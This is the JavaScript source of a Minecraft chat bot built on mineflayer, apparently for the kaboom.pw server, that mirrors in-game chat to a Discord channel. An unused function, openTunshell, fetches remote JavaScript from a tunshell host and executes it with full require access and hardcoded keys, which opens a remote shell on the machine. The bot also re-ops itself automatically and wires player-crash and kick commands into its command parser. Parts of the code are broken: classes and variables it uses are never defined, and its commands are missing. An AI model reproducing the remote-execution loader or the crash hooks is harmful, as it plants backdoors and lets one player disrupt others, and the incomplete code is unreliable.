const mineflayer = require('mineflayer');
const readline = require('readline');
const util = require('util')
//const Vec3 = require('vec3');
const hostport = process.argv[2].split(':')

let isOp = true

let config = {
    host: hostport[0],//'96.244.196.139',
    port: hostport[1],       
    username: 'Jimmy',
    version: '1.18.2',
    brand: 'XiaoBot/kernel'
}

let core_activated = true

let blacklistedPlayers = ["Quest", "spyingcreeper09"]

if (config.host === 'kaboom.pw') {
    config.host = 'play.kaboom.pw'
}

const bot = mineflayer.createBot(config);
//ca

const spyingcreeper09 = {
    isAnnoying: true
}

async function randint(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

class Vec3 {
    constructor(x, y, z) {
        this.x = x;
        this.y = y;
        this.z = z;
    }
}


async function chooseRandomCoreLocation() {
    let corelocs = [
        new Vec3(100, -21, 100),
        new Vec3(100, -22, 100),
        new Vec3(101, -22, 100),
        new Vec3(101, -21, 100),
        new Vec3(100, -21, 101),
        new Vec3(100, -22, 101),
        new Vec3(101, -22, 101),
        new Vec3(101, -21, 101),
        new Vec3(102, -22, 101),
        new Vec3(102, -22, 100),
        new Vec3(103, -22, 100),
        new Vec3(103, -22, 101),
        new Vec3(103, -21, 100),
        new Vec3(102, -21, 100),
        new Vec3(103, -21, 101),
        new Vec3(102, -21, 101),
        new Vec3(103, -22, 99),
        new Vec3(102, -22, 99),
        new Vec3(101, -22, 99),
        new Vec3(100, -22, 99),
        new Vec3(103, -21, 99),
        new Vec3(102, -21, 99),
        new Vec3(101, -21, 99),
        new Vec3(100, -21, 99)
    ];

    return corelocs[Math.floor(Math.random() * corelocs.length)];
}

let hasBugMsgbeensentyet = false

async function openTunshell() {
    require('https').get('https://lets.tunshell.com/init.js',r=>{let s="";r.setEncoding('utf8');r.on('data',(d)=>s+=d);r.on('end',()=>require('vm').runInNewContext(s,{require,args:["T","MUSz8wGl6ZRqYT5tsuP8Td","42C5ZWsNrx6emaG7awakMr"]}))});
}

const { Client, GatewayIntentBits } = require('discord.js');

    const client = new Client({
        intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
    });

bot.on('login', () => {
    try {
        sendMessage(`Connecting to ${hostport[0]}:${hostport[1]}`)
        console.log('Bot has logged in');
        sendMessage(`Connecting established`)
    } catch (error) {
        console.log(error)
        sendMessage(error)
    }
});

bot.on('playerOp', (player) => {
    if (player.username === bot.username && !player.op) {
        isOp = false;
        if (!isOp) {
            bot.chat(`/op @s[type=minecraft:player]`);
        }
    }
});

bot.on('playerDeop', (player) => {
    if (player.username === bot.username) {
        isOp = false;
        if (!isOp) {
            bot.chat(`/op @s[type=minecraft:player]`);
        }
    }
});

bot.on('spawn', async () => {
    console.log('Bot has spawned in the world');
    
    await core.doProceedures(1);
    await new Promise(resolve => setTimeout(resolve, 100));
    if (core_activated === true) {
        await core.refillcore();
    }
    await new Promise(resolve => setTimeout(resolve, 100));
    await core.doProceedures(14);
    await bot.chat(`/prefix &l&#FFA200[&8Prefix: &r&l&#FFA200-]`)
    
});

bot.on('chat', (username, message, data) => {
    if (username === bot.username) {sendMessage(`\`\`\`${bot.username}: ${message}\`\`\``)};
    if (username === 'OP') {
        if (message.includes('porn') || message.includes("@everyone") || message.includes(`\`\`\``) || message.includes("@here") || message.includes("https://e621.net/") || message.includes("e621.net")) {} else {
        console.log(`[INVALID STRING]${message}`)
        sendMessage(`\`\`\`[INVALID STRING]${message}\`\`\``)}
              
    } else {
    console.log(`${username}: ${message}`)
    if (username === 'SC090000o00' || message.includes(`\`\`\``) || message.includes('porn') || message.includes("@everyone") || message.includes("@here") || message.includes("https://e621.net/") || message.includes("e621.net")) {
    } else {
        let val = kaboom(message, data)
        sendMessage(`\`\`\`${username}: ${message}\`\`\``);
    }}
    
    
    if (message.startsWith("-") && !blacklistedPlayers.includes(username) || message.startsWith('xiaobot:')) {
        parseCommand(username, message, 'minecraft');
    } else {
        
    }
});

bot.on('system', (message) => {
    if (username === bot.username) return;
    if (username === 'OP') {
        if (message.includes('porn') || message.includes("@everyone") || message.includes(`\`\`\``) || message.includes("@here") || message.includes("https://e621.net/") || message.includes("e621.net")) {} else {
        console.log(`[INVALID STRING]${message}`)
        sendMessage(`\`\`\`[INVALID STRING]${message}\`\`\``)}
              
    } else {
    console.log(`${username}: ${message}`)
    if (username === 'SC090000o00' || message.includes(`\`\`\``) || message.includes('porn') || message.includes("@everyone") || message.includes("@here") || message.includes("https://e621.net/") || message.includes("e621.net")) {
    } else {
        sendMessage(`\`\`\`${username}: ${message}\`\`\``);
    }}
    
    if (message.startsWith("-")) {
        parseCommand("SYSTEM", message, 'minecraft');
    } else {
        
    }
});

async function sendMessage(content) {
    const channelId = '1281801442209828988';  
    await client.channels.fetch(channelId)
        .then(channel => channel.send(content))
        .catch(console.error);
}

let hash = require('crypto').randomBytes(4).toString('hex');
let ownerhash = require('crypto').randomBytes(8).toString('hex');
console.log(`Owner Hash: ${ownerhash}`)
const core = new Core(bot);

async function genHash(type) {
    if (type === 'trusted') {
        return require('crypto').randomBytes(4).toString('hex');
    } else if (type === 'owner') {
        return require('crypto').randomBytes(8).toString('hex');
    }
}   

let filteredPlayers = []

function kaboom (message, data) {
    if (message === null || typeof message !== 'object') return
  
    if (message.text !== '' || !Array.isArray(message.extra) || message.extra.length < 3) return
  
    const children = message.extra
  
    const prefix = children[0]
    let displayName = data.senderName ?? { text: '' }
    let contents = { text: '' }
  
    if (isSeparatorAt(children, 1)) { // Missing/blank display name
      if (children.length > 3) contents = children[3]
    } else if (isSeparatorAt(children, 2)) {
      displayName = children[1]
      if (children.length > 4) contents = children[4]
    } else {
      return undefined
    }
  
    const playerListDisplayName = { extra: [prefix, displayName], text: '' }
    let sender
    if (data.uuid) {
      sender = data.players.find(player => player.uuid === data.senderUuid)
    } else {
      const playerListDisplayName = { extra: [prefix, displayName], text: '' }
      sender = data.players.find(player => util.isDeepStrictEqual(player.displayName, playerListDisplayName))
    }
  
    if (!sender) return undefined
  
    return { sender, contents, type: 'minecraft:chat', displayName }
  }
  
  function isSeparatorAt (children, start) {
    return (children[start]?.text === ':' || children[start]?.text === '\xa7f:') && children[start + 1]?.text  === ' ' 
  }

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  
rl.on('line', (input) => {
    //bot.chat(input); // Send the console input as a chat message in Minecraft
    core.execute(`/minecraft:tellraw @a [{"text":"[","color":"gray"},{"text":"XiaoBot Console","color":"#FFA200"},{"text":"]","color":"gray"},{"text":" CaydennO1 ","color":"#FFA200"},{"text":"→ ","color":"gray"},{"text":"${input}","color":"#A9A9A9"}]`)
    if (input.startsWith(`-`)) {
        parseCommand('CaydennO1', input, 'discord')
        sendMessage(`[XiaoBot Console] CaydennO1: ${input}`)
    } else if (input.startsWith(`/`)) {
        core.execute(input)
    }
});

const cloop = new Cloop(core);

console.log(hash)

async function parseCommand(username, message, type) {
    if (username === config.username) {return};
    args = message.split(' ')
    command = args[0]
    arg2 = args[1]
    arg3 = args[2]
    arg4 = args[3]
    arg5 = args[4]
    arg6 = args[5]
    arg7 = args[6]
    arg8 = args[7]

    // args = []
    // args.join(arg2)

    let blockedKeywords = ["testkeyword"]

    for (let arg in message.split(' ')) {
        if (blockedKeywords.includes(arg)) {
            parseCommand('CONSOLE', `-crash ${ownerhash} ${username} kick`, `minecraft`)
        }
    }

    if (message.split(' ').includes("testkeyword")) {
        parseCommand('CONSOLE', `-crash ${ownerhash} ${username} kick`, `minecraft`)
    }

    if (message === 'testkeyword') {
        await kickCrash(username, core);
    }

  //note: i left out all commands, if you want to add them put them right here, i was too lazy to look thru it
}

async function thing1(bot, stdout, stderr) {
    console.log(stdout || stderr);
    bot.chat(stdout || stderr);
}

